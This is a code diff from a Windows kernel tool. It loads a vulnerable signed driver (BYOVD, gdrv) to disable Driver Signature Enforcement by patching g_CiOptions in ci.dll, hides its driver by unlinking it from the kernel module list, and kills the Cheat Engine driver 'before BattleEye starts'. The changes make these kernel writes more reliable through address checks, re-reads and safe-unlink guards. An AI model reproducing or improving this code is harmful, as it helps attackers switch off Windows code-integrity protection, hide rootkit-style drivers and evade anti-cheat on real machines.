-                kwrite(ef + 0x008, eb, 8); /* next.Blink = prev */
-                kwrite(entry + 0x000, entry, 8); /* self-point to avoid dangling ptr */
-                kwrite(entry + 0x008, entry, 8);
-                logf("[+] DKOM: driver unlinked (entry=0x%016llX dll_base=0x%016llX)",
-                     (unsigned long long)entry, (unsigned long long)dll_base);
+            /* Kernel VA sanity: LDR entries must be in upper-canonical kernel range */
+            if (ef < 0xFFFF800000000000ULL || eb < 0xFFFF800000000000ULL) {
+                logf("[!] DKOM: ef=0x%016llX or eb=0x%016llX not in kernel range — skip",
+                     (unsigned long long)ef, (unsigned long long)eb);
+                return;
             }
+            /* Safe-unlink pre-check (mirrors Windows' own RemoveEntryList guard):
+               ef->Blink must equal entry, eb->Flink must equal entry.
+               If CR3 is off and gives garbage ef/eb, this catches it and aborts
+               instead of corrupting pool headers → KERNEL_SECURITY_CHECK_FAILURE. */
+            UINT64 ef_blink = 0, eb_flink = 0;
+            kread(ef + 0x008, 8, &ef_blink);
+            kread(eb + 0x000, 8, &eb_flink);
+            if (ef_blink != entry || eb_flink != entry) {
+                logf("[!] DKOM: list inconsistent ef->Blink=0x%016llX eb->Flink=0x%016llX entry=0x%016llX — skip",
+                     (unsigned long long)ef_blink, (unsigned long long)eb_flink, (unsigned long long)entry);
+                return;
+            }
+            kwrite(eb + 0x000, ef, 8); /* prev.Flink = next */
+            kwrite(ef + 0x008, eb, 8); /* next.Blink = prev */
+            kwrite(entry + 0x000, entry, 8); /* self-point Flink/Blink */
+            kwrite(entry + 0x008, entry, 8);
+            logf("[+] DKOM: driver unlinked (entry=0x%016llX dll_base=0x%016llX)",
+                 (unsigned long long)entry, (unsigned long long)dll_base);
             return;
         }
         UINT64 next = 0;
@@ -1116,33 +1401,98 @@ static void dkom_unlink_driver(UINT64 driver_kva) {
 static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
     ULONG vsz=0; UINT64 ci_base=get_ci_base(&vsz);
     if(!ci_base){logf("[!] ci.dll not in module list.");return FALSE;}
+    UINT64 orig_val = 0x06; /* will be overwritten with actual read value */
 
     /* Primary: precise pattern scan — no kernel read, SMAP-safe */
     UINT64 kva = find_ci_options_precise(ci_base);
 
-    /* Fallback: AOB scan.
-     * For physical backends (LNV/TS): kread is reliable — verify the candidate holds
-     * the expected g_CiOptions value (0x06 = DSE enabled) before writing.
-     * For gdrv (SMAP makes kread unreliable): use first writable-section candidate only.
-     * This prevents writing to a wrong address and causing KMODE_EXCEPTION_NOT_HANDLED. */
+    /* Verify the precise result before trusting it (all backends including gdrv).
+       gdrv_read now reads byte-by-byte through KSHARED+0x2EE only, which is
+       SMAP-safe and reliable.  Three-layer check:
+       1) alignment + CI.dll VA bounds
+       2) DWORD read — g_CiOptions upper 3 bytes always 0x00, value 0..63
+       3) stability re-read after 15 ms — static globals don't change */
+    if (kva) {
+        /* Layer 1: alignment + bounds */
+        if ((kva & 3) || kva < ci_base || kva >= ci_base + (UINT64)vsz) {
+            logf("[!] precise: kva=0x%016llX misaligned or outside CI.dll — discarding",
+                 (unsigned long long)kva);
+            kva = 0;
+        }
+        if (kva) {
+            /* Layer 2: DWORD read — g_CiOptions upper 3 bytes must be 0, low byte 0..0x3F.
+               Real values: 0x00 (off), 0x06 (DSE on), 0x08 (WinLoad), 0x0E, 0x16, 0x46 (UMCI).
+               Writable-section check (Layer 4) is the primary guard against code-section hits;
+               the value range rejects obviously invalid DWORDs (upper bytes non-zero, etc.). */
+            UINT64 cur = 0;
+            if (!kread(kva, 4, &cur) || cur > 0x3F) {
+                logf("[!] precise: kva=0x%016llX DWORD=0x%08llX — out of range, discarding",
+                     (unsigned long long)kva, (unsigned long long)cur);
+                kva = 0;
+            } else {
+                /* Layer 3: stability — static global value must not change */
+                UINT64 cur2 = 0;
+                Sleep(15);
+                if (!kread(kva, 4, &cur2) || cur2 != cur) {
+                    logf("[!] precise: kva=0x%016llX unstable 0x%08llX→0x%08llX — discarding",
+                         (unsigned long long)kva, (unsigned long long)cur, (unsigned long long)cur2);
+                    kva = 0;
+                } else {
+                    /* Layer 4: writable section check — gdrv writes via RtlCopyMemory (no WP
+                       bypass on some versions); write to read-only .text page → kernel #PF → BSOD.
+                       Even with WP bypass, landing in a non-data section means wrong address. */
+                    if (!ci_kva_is_writable(kva, ci_base)) {
+                        logf("[!] precise: kva=0x%016llX not in writable CI.dll section — discarding",
+                             (unsigned long long)kva);
+                        kva = 0;
+                    } else {
+                        orig_val = cur & 0xFF;
+                        logf("[*] precise: kva=0x%016llX DWORD=0x%02llX stable writable — verified",
+                             (unsigned long long)kva, (unsigned long long)cur);
+                    }
+                }
+            }
+        }
+    }
+
+    /* Fallback: AOB scan — verify every candidate on all backends. */
     if(!kva) {
         UINT64 cands[MAX_CAND]; ULONG n=scan_ci_options(ci_base,vsz,cands,MAX_CAND);
         if(n) {
-            if(g_backend!=BE_GDRV) {
+            {
                 for(ULONG ci=0; ci<n && !kva; ci++) {
-                    UINT64 cur=0;
-                    if(kread(cands[ci],1,&cur) && cur==0x06) {
-                        kva=cands[ci];
-                        logf("[*] AOB cand[%lu]=0x%016llX verified (val=0x%02llX)",
-                             (unsigned long long)ci,(unsigned long long)kva,(unsigned long long)cur);
-                    } else {
-                        logf("[*] AOB cand[%lu]=0x%016llX skipped (val=0x%02llX)",
-                             (unsigned long long)ci,(unsigned long long)cands[ci],(unsigned long long)cur);
+                    /* Alignment + bounds guard first */
+                    if ((cands[ci] & 3) || cands[ci] < ci_base || cands[ci] >= ci_base+(UINT64)vsz) {
+                        logf("[*] AOB cand[%lu]=0x%016llX misaligned/oob — skip",
+                             (unsigned long long)ci,(unsigned long long)cands[ci]);
+                        continue;
                     }
+                    /* DWORD verify: upper 3 bytes must be 0, byte must be 0x06 (enabled) */
+                    UINT64 cur=0;
+                    if(!kread(cands[ci],4,&cur) || cur > 0x3F || (cur & 0xFF) != 0x06) {
+                        logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%08llX — skip",
+                             (unsigned long long)ci,(unsigned long long)cands[ci],(unsigned long long)cur);
+                        continue;
+                    }
+                    /* Stability re-read */
+                    UINT64 cur2=0; Sleep(15);
+                    if(!kread(cands[ci],4,&cur2) || cur2 != cur) {
+                        logf("[*] AOB cand[%lu]=0x%016llX unstable — skip",
+                             (unsigned long long)ci,(unsigned long long)cands[ci]);
+                        continue;
+                    }
+                    /* Writable section re-check (scan_ci_options already filters, but
+                       validate here too so the final accepted KVA is always confirmed) */
+                    if (!ci_kva_is_writable(cands[ci], ci_base)) {
+                        logf("[*] AOB cand[%lu]=0x%016llX not writable — skip",
+                             (unsigned long long)ci,(unsigned long long)cands[ci]);
+                        continue;
+                    }
+                    kva=cands[ci];
+                    orig_val = cur & 0xFF;
+                    logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%02llX stable writable — verified",
+                         (unsigned long long)ci,(unsigned long long)kva,(unsigned long long)cur);
                 }
-            } else {
-                kva=cands[0];
-                logf("[*] precise failed, gdrv fallback cand[0]=0x%016llX",(unsigned long long)kva);
             }
         }
     }
@@ -1155,8 +1505,9 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
     Sleep(50);
     if(!is_dse_disabled()){logf("[!] Failed to patch g_CiOptions.");return FALSE;}
 
-    *out_kva=kva; *out_orig=0x06; /* assume default; can't kread reliably */
-    logf("[+] DSE DISABLED");return TRUE;
+    *out_kva=kva; *out_orig=orig_val;
+    logf("[+] DSE DISABLED");
+    return TRUE;
 }
 
 static void restore_dse(UINT64 kva,UINT64 orig) {
@@ -1177,16 +1528,26 @@ static BOOL read_yes(void){
 
 static BOOL WINAPI CtrlHandler(DWORD t){(void)t;scm_unload_current();return FALSE;}
 
+static int real_main_inner(int argc,char **argv);
 static int real_main(int argc,char **argv);
 int main(int argc,char **argv){
     SetConsoleCtrlHandler(CtrlHandler,TRUE);
-    __try{return real_main(argc,argv);}
-    __except(EXCEPTION_EXECUTE_HANDLER){
-        logf("[!] FATAL 0x%08lX",GetExceptionCode());scm_unload_current();return 1;
-    }
+    return real_main(argc,argv);
+}
+
+static LONG WINAPI TopLevelExHandler(EXCEPTION_POINTERS *ep){
+    DWORD code=ep->ExceptionRecord->ExceptionCode;
+    logf("[!] FATAL exception 0x%08lX — unloading BYOVD driver before crash",(unsigned long)code);
+    scm_unload_current();
+    return EXCEPTION_CONTINUE_SEARCH;
 }
 
 static int real_main(int argc,char **argv){
+    SetUnhandledExceptionFilter(TopLevelExHandler);
+    return real_main_inner(argc,argv);
+}
+
+static int real_main_inner(int argc,char **argv){
     RunMode mode=MODE_INTERACTIVE;
     if(argc>=2){
         if(_stricmp(argv[1],"-off")==0) mode=MODE_OFF;
@@ -1233,6 +1594,7 @@ static int real_main(int argc,char **argv){
         if(hf==INVALID_HANDLE_VALUE){logf("[!] -on: state file missing.");return 1;}
         DWORD rd=0; ReadFile(hf,&st,sizeof(st),&rd,NULL); CloseHandle(hf);
         if(rd!=sizeof(st)||!st.kva){logf("[!] -on: state corrupt.");return 1;}
+        init_rand_svc();
         DWORD be=bootstrap_driver(ntoskrnl_kva);
         if(be==2){scm_unload_current();return 2;}
         if(be)  {scm_unload_current();return 1;}
@@ -1243,6 +1605,7 @@ static int real_main(int argc,char **argv){
 
     if(mode==MODE_INTERACTIVE) printf("[*] Loading driver...\n");
 
+    init_rand_svc();
     DWORD be=bootstrap_driver(ntoskrnl_kva);
     if(be==3){
         logf("[!] WDAC permanent block — all backends blocked.");
@@ -1281,6 +1644,7 @@ static int real_main(int argc,char **argv){
             UINT64 byovd_kva = get_byovd_kva(g_drvPath);
             if (byovd_kva) dkom_unlink_driver(byovd_kva);
         }
+        nuke_dbk64(); /* kill CE kernel driver before BattleEye starts */
         char stpath[MAX_PATH]; get_state_path(stpath,sizeof(stpath));
         DSE_STATE st={kva,orig};
         HANDLE hf=CreateFileA(stpath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
